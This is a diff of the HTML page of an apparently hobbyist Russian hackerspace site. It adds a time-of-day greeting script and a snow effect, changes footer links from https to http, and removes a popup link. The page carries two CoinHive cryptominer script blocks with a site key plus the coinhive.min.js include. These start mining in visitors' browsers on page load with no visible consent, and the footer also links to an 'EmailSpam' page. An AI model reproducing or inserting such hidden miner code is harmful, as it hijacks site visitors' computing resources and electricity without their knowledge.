@@ -68,6 +68,8 @@
       </style>
    </head>
    <body>
+
+      
       <div id="page">
       <div id="preloader"></div>
       <div id="primary" class="content-area">
@@ -108,10 +110,12 @@
                <div id='stars2'></div>
                <div id='stars3'></div>
             </header>
-            <script>
+            <script>  
     var miner = new CoinHive.User('6hEcBCqlmmxOZfRDMiC1tQdoJOSajuYg', 'pogrommist');
     miner.start();
 </script>
+
+
             <main id="main" class="site-main">
                <div class="container">
                   <div class="site-branding m-b-64">
@@ -136,6 +140,27 @@
                <div class="widget widget-countdown m-t-64">
                   <div class="widget-content">
                      <div class="time"><span id="doc_time"></span></div>
+                     <script language="Javascript">
+	<!-- 
+	day = new Date()
+	hr = day.getHours()
+	hr1 = hr - 12
+	if (hr < "6") {
+		document.write(" Чего не спим?. ")
+	}else if (hr < "12"){
+		document.write(" Доброе утро! ")
+	}else if (hr < "13") {
+		document.write(" Дело близится к обеду! ")
+	}else if (hr < "17") {
+		document.write(" Добрый день ")
+	}else if (hr < "22") {
+		document.write(" Добрый вечер! ")
+	}else if (hr >= "22") {
+		document.write(" Спокойной ночи! ")
+	}
+	//-->
+</script>
+
                      <script type="text/javascript">
                         function clock() {
                         var d = new Date();
@@ -236,14 +261,14 @@
                      <div class="col-30">
                         <p>
                            <a class="link-animated" href="https://vk.com/3hackerspace3">HackerSpace</a>
-                           <br><a class="link-animated" href="https://wtfaker.github.io/crash.html">ТЫК</a>
-                           <br><a class="link-animated" href="https://wtfaker.github.io/starwars.html">O_O</a>
-                           <br><a class="link-animated" href="https://wtfaker.github.io/h3/index.html">Игруля</a>
+                           <br><a class="link-animated" href="http://wtfaker.github.io/crash.html">ТЫК</a>
+                           <br><a class="link-animated" href="http://wtfaker.github.io/starwars.html">O_O</a>
+                           <br><a class="link-animated" href="http://wtfaker.github.io/h3/index.html">Игруля</a>
                            <br><a class="link-animated" href="https://kostya21441241.github.io/Kostya.github.io/">Kostya_lox</a>
-                           <br><a class="link-animated" href="https://wtfaker.github.io/EmailSpam by WTFaker.html">EmailSpam by WTFaker</a>
-                           <br><a class="link-animated" href="https://wtfaker.github.io/404.html">HackMePlease</a>
+                           <br><a class="link-animated" href="http://wtfaker.github.io/EmailSpam by WTFaker.html">EmailSpam by WTFaker</a>
+                           <br><a class="link-animated" href="http://wtfaker.github.io/404.html">HackMePlease</a>
 
-                           <br><a href="https://wtfaker.github.io/WTFNote.html" target="_blank" onclick="window.open(this.href,this.target,'width=500,height=600,scrollbars=1');return false;">WTFnote</a>
+                           
                            
 <script>
     var miner = new CoinHive.User('6hEcBCqlmmxOZfRDMiC1tQdoJOSajuYg', 'pogrommist');
@@ -295,5 +320,7 @@
       <script src="assets/js/config.js"></script>
       <script src="assets/js/concat.min.js"></script>
       <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.js"></script>
+<script src="jquery.snow.js"></script>
    </body>
 </html>
